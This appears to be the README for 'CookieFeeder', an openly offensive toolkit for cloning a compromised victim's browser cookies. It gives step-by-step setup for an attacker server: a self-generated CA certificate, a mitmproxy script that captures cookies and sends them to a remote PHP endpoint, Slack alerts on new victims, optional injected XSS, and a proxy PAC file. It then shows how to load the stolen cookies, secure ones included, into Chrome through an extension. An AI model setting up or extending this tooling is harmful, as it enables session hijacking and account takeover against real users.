# CookieFeeder

CookieFeeder is a Chrome Extension designed to help in the process of cloning cookies from a compromised victim, by replicating the cookies from a remote log file into the browser. The extension will inject all cookies, including secured cookies, into all compromised websites without the need to have url opened.

## Server Setup

Follow this in case you want to do a full setup, including the server for capturing the cookies. Otherwise, skip to the next section.

1. Create an EC2/Lightsail instance. Install apache2, setup your domain and SSL certificates.

2. Clone the repository:
    ```
    git clone https://github.com/thiagomayllart/Blender
    cd Blender/CookieFeeder
    ``` 
3. Install mitmproxy:
    ```
    apt install mitmproxy
    ```
4. Change `cert_gen.cnf` as you wish. This is the config file to create the CA certificate and key. Ideally you will only need to change the "dn" section with other information.
5. Run
    ```
    ./generate_certs.sh`
    ```
6. Save your `server.php` in your apache2 path (e.g. /var/www/html). You can change the filename, only ensure you have installed php mod in your apache2 server:
    ```
    apt install php libapache2-mod-php
    ```
7. Generate you IV and key:
    ```
    ./generate_key_iv.sh
    ```
8. Replace the KEY and IV in the `cookie_monitor.py` file:
    ```
    KEY = base64.b64decode('YOUR_KEY')
    IV = base64.b64decode('YOUR_IV')
    ```
9. Replace the PHP url in the `cookie_monitor.py` file. This should be the url of the server.php:
    ```
    SERVER_URL = 'https://YOUR_ENDPOINT/server.php'
    ```
10. Add your Slack Webhook for alerting upon new connections:
    ```
    SLACK_WEBHOOK_URL = 'https://ADD_HERE'
    ```
11. If you are injecting XSS in the pages, replace here:
    ```
    script.src = 'YOUR_SCRIPT_JS_URL';
    ```
12. Also replace this variable `WHITELISTED_HOST` with the url your XSS is stored.
13. Modify the `your_proxy_domain` in the settings.pac file. This should be the endpoint you will be running your proxy. Ideally, the proxy and the apache2 should be in the same server, thus, the domain should be the same.
14. Store your settings.pac file (and change the name) in the root of your apache web server.
15. Start the proxy:
    ```
    mitmdump -s cookie_monitor.py --set stream_large_bodies=1m --set flow_detail=0 --set max_flow_size=100m --set connection_strategy=lazy --set block_global=false -p 8080
    ```

## Extension Setup

1. Clone the repository:
```
git clone https://github.com/thiagomayllart/CookieFeeder
```
2. Create a new Chrome Profile. This is useful to avoid overwriting or conflicting with your actual cookies.
```
Customize and Control Google Chrome -> Select the current Profile -> Add new profile
```
3. Install CookieFeeder. 
4. You should have already created your key/IV from the previous section, if not, run `generate_key_iv.sh`. Using those keys, replace `YOUR_KEY` and `YOUR_IV` in CookieFeeder/cookiefeeder/background.js.
    - a. ```Navigate to chrome://extensions/```
    - b. ```Select "load unpacked"```
    - c. ```Select the cookiefeeder directory inside the clone repository```
    - d. ```Extension will be added to Chrome```

5. Click on the extension icon, input the Cookies URL and click on Save. Wait a few seconds as the cookies will be synchronized with your Chrome profile.

